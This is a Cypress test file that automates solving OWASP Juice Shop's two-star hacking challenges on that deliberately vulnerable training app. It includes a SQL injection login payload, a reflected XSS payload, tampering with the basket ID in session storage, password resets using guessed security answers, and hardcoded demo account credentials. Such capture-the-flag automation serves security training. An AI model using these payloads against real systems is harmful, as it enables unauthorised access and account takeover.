import firstVisitPopups from '../POM/FirstVisitPopups.pom';
import headerBar from '../POM/headerBar.pom';
import loginPage from '../POM/loginPage.pom';
import resetPassword from '../POM/resetPassword.pom';
import registrationPage from '../POM/registrationPage.pom';
import sideNav from '../POM/sideNav.pom';
import complaint from '../POM/complaint.pom';

describe('OWASP JuiceShop Achivments unlocking Automation', () => {
  context('2 - stars vulnerabilities', () => {

    before(() => {
      cy.visit('/');
      firstVisitPopups.closeFirstVisitMesseges();
    });

    beforeEach(() => {
      Cypress.Cookies.preserveOnce('cookieconsent_status', 'welcomebanner_status', 'language');
    });

    it('1 - Login Admin', () => {
      loginPage.login("' OR '1'='1'--", " ");
      cy.checkIsAchivSolvedXHR('Login Admin');
    });

    it('2 - Admin Section', () => {
      //path found in main-es2018.js file
      cy.visit('/#/administration');
      cy.checkIsAchivSolvedXHR('Admin Section');
    });

    it('3 - View Basket', () => {
      loginPage.login("' OR '1'='1'--", " ");
      headerBar.basketButon().click();
      cy.window()
        .its("sessionStorage").then((storage) => {
          storage.bid = 2;
        });
      cy.reload();
      cy.checkIsAchivSolvedXHR('View Basket');
    });

    it('4 - Get rid of all 5-star customer feedback', () => {
      loginPage.login("' OR '1'='1'--", " ");
      cy.intercept('GET', '/api/Feedbacks/').as('getFeedbacks');
      cy.visit('/#/administration');
      cy.wait('@getFeedbacks');
      cy.get("div[class='customer-table'] mat-row", { timeout: 10000 }).each((customerFeedback) => {
        if(customerFeedback.find("mat-icon").length === 5){
          customerFeedback.find("button").click();
        }
      });
      cy.checkIsAchivSolvedXHR('Five-Star Feedback');
    });

    it('5 - Meta Geo Stalking', () => {
      //used meta data from Photo Wall img and admin section(email)
      const newPassword = 'newPassword123.';
      const securityAnswer = 'Daniel Boone National Forest';
      const johnEmail = 'john@juice-sh.op';
      resetPassword.resetPassword(johnEmail, newPassword, securityAnswer)
      cy.checkIsAchivSolvedXHR('Meta Geo Stalking');
    });

    it('6 -  Deprecated Interface', () => {
      const filepath = 'test1.xml';
      registrationPage.register();
      loginPage.login(registrationPage.userEmail, registrationPage.userPassword);
      sideNav.navigateToComplaint();
      complaint.sendComplaint(filepath);
      cy.checkIsAchivSolvedXHR('Deprecated Interface');
    });

    it('7 - Login MC SafeSearch', () => {
      const MCSafeSearchEmail = 'mc.safesearch@juice-sh.op';
      const MCSafeSearchPass = 'Mr. N00dles';
      loginPage.login(MCSafeSearchEmail, MCSafeSearchPass);
      cy.checkIsAchivSolvedXHR('Login MC SafeSearch');
    });

    it('8 - Password Strength', () => {
      const adminEmail = 'admin@juice-sh.op';
      const adminPass = 'admin123';
      loginPage.login(adminEmail, adminPass);
      cy.checkIsAchivSolvedXHR('Password Strength');
    });

    it('9 - Password Strength', () => {
      cy.request( '/.well-known/security.txt');
      cy.checkIsAchivSolvedXHR('Security Policy');
    });
    
    it("10 - Weird Crypto", () => {
      cy.intercept('captcha/').as('captcha');
      sideNav.navigateToCustomerFeedback();
      cy.wait('@captcha').then((captcha) => {
        cy.request({
          method: 'POST',
          url: 'http://localhost:3000/api/Feedbacks/',
          body: {
            captchaId: captcha.response.body.captchaId,
            captcha: `${captcha.response.body.answer}`,
            comment: "base64",
            rating: 2
          }
        });
      });
      cy.checkIsAchivSolvedXHR('Weird Crypto');
    });

    it('11 - Password Strength', () => {
      cy.request( '/.well-known/security.txt');
      cy.checkIsAchivSolvedXHR('Security Policy');
    });

    it.skip('12 - Reflected XSS', () => {
      //This challenge is not available on Docker!
      cy.visit('/#/track-result?id=%3Ciframe%20src%3D%22javascript:alert(%60xss%60)%22%3E')
      cy.checkIsAchivSolvedXHR('Reflected XSS'); 
    });

    it('13 - Visual Geo Stalking', () => {
      const newPassword = 'newPassword123.';
      const securityAnswer = 'ITsec';
      const emmaEmail = 'emma@juice-sh.op';
      resetPassword.resetPassword(emmaEmail, newPassword, securityAnswer)
      cy.checkIsAchivSolvedXHR('Visual Geo Stalking'); 
    });

  });
});
